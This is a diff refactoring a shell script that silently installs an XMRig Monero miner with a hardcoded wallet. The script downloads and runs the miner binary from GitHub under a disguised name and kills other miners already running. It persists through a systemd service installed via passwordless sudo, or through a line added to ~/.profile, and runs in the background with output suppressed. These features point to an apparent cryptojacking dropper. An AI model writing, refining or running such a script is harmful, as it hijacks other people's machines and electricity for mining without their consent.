@@ -1,5 +1,5 @@
 #!/bin/sh
-# mfeederr.sh — MoneroOcean miner setup (POSIX sh, minimal output, hardcoded wallet)
+# mfeederr.sh — MoneroOcean miner setup (strict POSIX sh, minimal output)
 set -u
 
 WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
@@ -11,84 +11,129 @@ CFG="$DIR/config.json"
 CFGB="$DIR/config_background.json"
 
 fail() { echo "FAILED: $1"; exit 1; }
-
 have() { command -v "$1" >/dev/null 2>&1; }
 
-download() { # url out
+download() {
   if have curl; then curl -sL "$1" -o "$2"
   elif have wget; then wget -q "$1" -O "$2"
   else return 1; fi
 }
 
-fetch() { # url -> stdout
+fetch() {
   if have curl; then curl -s "$1"
   elif have wget; then wget -qO- "$1"
   else return 1; fi
 }
 
-# --- preflight ---
-[ -n "${HOME:-}" ] && [ -d "$HOME" ] || fail "HOME not set"
-have curl || have wget || fail "no curl/wget"
-WBASE="${WALLET%%.*}"
-{ [ "${#WBASE}" = 95 ] || [ "${#WBASE}" = 106 ]; } || fail "bad wallet length ${#WBASE}"
-
-# --- port ---
-if have nproc; then
-  CPU_THREADS=$(nproc 2>/dev/null || echo 1)
-else
-  CPU_THREADS=$(grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
+# ---------- preflight ----------
+if [ -z "${HOME:-}" ]; then
+  fail "HOME not set"
 fi
-[ -z "$CPU_THREADS" ] && CPU_THREADS=1
+if [ ! -d "$HOME" ]; then
+  fail "HOME dir missing: $HOME"
+fi
 
-EXP=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP" -lt 1 ] && EXP=1
+if ! have curl; then
+  if ! have wget; then
+    fail "no curl and no wget"
+  fi
+fi
+
+WBASE="${WALLET%%.*}"
+WLEN="${#WBASE}"
+if [ "$WLEN" != "95" ]; then
+  if [ "$WLEN" != "106" ]; then
+    fail "bad wallet length $WLEN"
+  fi
+fi
+
+# ---------- port ----------
+CPU_THREADS=1
+if have nproc; then
+  T=$(nproc 2>/dev/null)
+  if [ -n "$T" ]; then CPU_THREADS="$T"; fi
+else
+  T=$(grep -c ^processor /proc/cpuinfo 2>/dev/null)
+  if [ -n "$T" ]; then CPU_THREADS="$T"; fi
+fi
+
+EXP=$(( CPU_THREADS * 700 / 1000 ))
+if [ "$EXP" -lt 1 ]; then EXP=1; fi
 
 power2() {
-  if have bc; then echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
-  else
-    n=$1; p=1
-    while [ "$p" -lt "$n" ]; do p=$((p*2)); done
-    echo "$p"
+  N="$1"
+  if have bc; then
+    echo "x=l($N)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
+    return
   fi
+  P=1
+  while [ "$P" -lt "$N" ]; do
+    P=$(( P * 2 ))
+  done
+  echo "$P"
 }
-PORT=$(( EXP * 30 )); [ "$PORT" -eq 0 ] && PORT=1
-PORT=$(( 10000 + $(power2 "$PORT") ))
-{ [ "$PORT" -ge 10001 ] && [ "$PORT" -le 18192 ]; } || fail "port out of range: $PORT"
 
-# --- clean ---
-pkill -f "$BIN_NAME" 2>/dev/null || true
-pkill -f "xmrig" 2>/dev/null || true
+PORT=$(( EXP * 30 ))
+if [ "$PORT" -eq 0 ]; then PORT=1; fi
+P2=$(power2 "$PORT")
+PORT=$(( 10000 + P2 ))
+if [ "$PORT" -lt 10001 ]; then
+  fail "port out of range: $PORT"
+fi
+if [ "$PORT" -gt 18192 ]; then
+  fail "port out of range: $PORT"
+fi
+
+# ---------- clean ----------
+pkill -f "$BIN_NAME" 2>/dev/null
+pkill -f "xmrig" 2>/dev/null
 rm -rf "$DIR" || fail "cannot remove $DIR"
 
-# --- download ---
+# ---------- download ----------
 mkdir -p "$DIR" || fail "cannot create $DIR"
-download "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" /tmp/xmrig.tar.gz \
-  || fail "download xmrig.tar.gz"
-tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null || fail "unpack xmrig.tar.gz"
+if ! download "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" /tmp/xmrig.tar.gz; then
+  fail "download xmrig.tar.gz"
+fi
+if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null; then
+  fail "unpack xmrig.tar.gz"
+fi
 rm -f /tmp/xmrig.tar.gz
 
-# --- rename ---
-[ -f "$DIR/xmrig" ] || fail "xmrig binary missing after unpack"
+# ---------- rename ----------
+if [ ! -f "$DIR/xmrig" ]; then
+  fail "xmrig binary missing after unpack"
+fi
 mv "$DIR/xmrig" "$BIN" || fail "rename failed"
 chmod +x "$BIN" || fail "chmod failed"
 
 if ! "$BIN" --help >/dev/null 2>&1; then
   REL=$(fetch "https://github.com/xmrig/xmrig/releases/latest")
   URL="https://github.com$(echo "$REL" | grep -o '"[^"]*xenial-x64.tar.gz"' | cut -d'"' -f2)"
-  [ -n "$URL" ] || fail "advanced binary broken, no stock fallback URL"
-  download "$URL" /tmp/xmrig.tar.gz || fail "stock xmrig download failed"
-  tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null || fail "stock xmrig unpack failed"
+  if [ -z "$URL" ]; then
+    fail "advanced binary broken, no stock fallback URL"
+  fi
+  if ! download "$URL" /tmp/xmrig.tar.gz; then
+    fail "stock xmrig download failed"
+  fi
+  if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null; then
+    fail "stock xmrig unpack failed"
+  fi
   rm -f /tmp/xmrig.tar.gz
-  [ -f "$DIR/xmrig" ] && mv -f "$DIR/xmrig" "$BIN"
-  "$BIN" --help >/dev/null 2>&1 || fail "stock xmrig also broken"
+  if [ -f "$DIR/xmrig" ]; then
+    mv -f "$DIR/xmrig" "$BIN"
+  fi
+  if ! "$BIN" --help >/dev/null 2>&1; then
+    fail "stock xmrig also broken"
+  fi
 fi
 
-# --- worker id ---
+# ---------- worker id ----------
 PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -E 's/[^a-zA-Z0-9-]+/_/g')
-[ -z "$PASS" ] && PASS="kdfeederr"
-[ "$PASS" = "localhost" ] && PASS="kdfeederr"
-[ -n "$EMAIL" ] && PASS="$PASS:$EMAIL"
+if [ -z "$PASS" ]; then PASS="kdfeederr"; fi
+if [ "$PASS" = "localhost" ]; then PASS="kdfeederr"; fi
+if [ -n "$EMAIL" ]; then PASS="$PASS:$EMAIL"; fi
 
-# --- config ---
+# ---------- config ----------
 cat > "$CFG" <<EOF
 {
   "api": { "id": null, "worker-id": null },
@@ -133,17 +178,23 @@ cat > "$CFG" <<EOF
   "watch": true
 }
 EOF
-[ -s "$CFG" ] || fail "config write failed"
+if [ ! -s "$CFG" ]; then
+  fail "config write failed"
+fi
 
 cp "$CFG" "$CFGB" || fail "background config copy failed"
 sed -i 's/"background": *false/"background": true/' "$CFGB" || fail "background config edit failed"
 
 if have python3; then
-  python3 -m json.tool "$CFG"  >/dev/null 2>&1 || fail "config.json invalid"
-  python3 -m json.tool "$CFGB" >/dev/null 2>&1 || fail "config_background.json invalid"
+  if ! python3 -m json.tool "$CFG" >/dev/null 2>&1; then
+    fail "config.json invalid"
+  fi
+  if ! python3 -m json.tool "$CFGB" >/dev/null 2>&1; then
+    fail "config_background.json invalid"
+  fi
 fi
 
-# --- miner.sh ---
+# ---------- miner.sh ----------
 cat > "$DIR/miner.sh" <<EOF
 #!/bin/sh
 if ! pidof $BIN_NAME >/dev/null; then
@@ -154,10 +205,13 @@ fi
 EOF
 chmod +x "$DIR/miner.sh" || fail "miner.sh chmod failed"
 
-# --- persistence (best effort) ---
+# ---------- persistence (best effort) ----------
 PERSIST=0
-if have sudo && sudo -n true 2>/dev/null && have systemctl; then
-  cat >/tmp/moneroocean_miner.service <<EOF
+
+if have sudo; then
+  if sudo -n true 2>/dev/null; then
+    if have systemctl; then
+      cat >/tmp/moneroocean_miner.service <<EOF
 [Unit]
 Description=Monero miner service
 [Service]
@@ -168,26 +222,54 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOF
-  if sudo -n mv /tmp/moneroocean_miner.service /etc/systemd/system/ 2>/dev/null \
-     && sudo -n systemctl daemon-reload 2>/dev/null \
-     && sudo -n systemctl enable --now moneroocean_miner.service 2>/dev/null; then
-    PERSIST=1
-  else
-    rm -f /tmp/moneroocean_miner.service
+      M1=0
+      if sudo -n mv /tmp/moneroocean_miner.service /etc/systemd/system/ 2>/dev/null; then
+        M1=1
+      fi
+      M2=0
+      if [ "$M1" = "1" ]; then
+        if sudo -n systemctl daemon-reload 2>/dev/null; then
+          M2=1
+        fi
+      fi
+      M3=0
+      if [ "$M2" = "1" ]; then
+        if sudo -n systemctl enable --now moneroocean_miner.service 2>/dev/null; then
+          M3=1
+        fi
+      fi
+      if [ "$M3" = "1" ]; then
+        PERSIST=1
+      else
+        rm -f /tmp/moneroocean_miner.service
+      fi
+    fi
   fi
 fi
+
 if [ "$PERSIST" = "0" ]; then
   LINE="$DIR/miner.sh --config=$CFGB >/dev/null 2>&1"
   if grep -q "moneroocean/miner.sh" "$HOME/.profile" 2>/dev/null; then
     PERSIST=1
-  elif echo "$LINE" >> "$HOME/.profile" 2>/dev/null; then
-    PERSIST=1
+  else
+    if echo "$LINE" >> "$HOME/.profile" 2>/dev/null; then
+      PERSIST=1
+    fi
   fi
 fi
 
-# --- start now ---
+# ---------- start now ----------
 nohup "$BIN" --config="$CFGB" >/dev/null 2>&1 &
 sleep 2
-pgrep -f "$BIN_NAME" >/dev/null || fail "miner did not stay up (see $DIR/xmrig.log)"
 
-echo "SUCCESS: pid=$(pgrep -f "$BIN_NAME" | tr '\n' ' ') port=$PORT persist=$([ "$PERSIST" = 1 ] && echo yes || echo no)"
+if ! pgrep -f "$BIN_NAME" >/dev/null; then
+  fail "miner did not stay up (see $DIR/xmrig.log)"
+fi
+
+PIDS=$(pgrep -f "$BIN_NAME" | tr '\n' ' ')
+if [ "$PERSIST" = "1" ]; then
+  PST="yes"
+else
+  PST="no"
+fi
+echo "SUCCESS: pid=$PIDS port=$PORT persist=$PST"
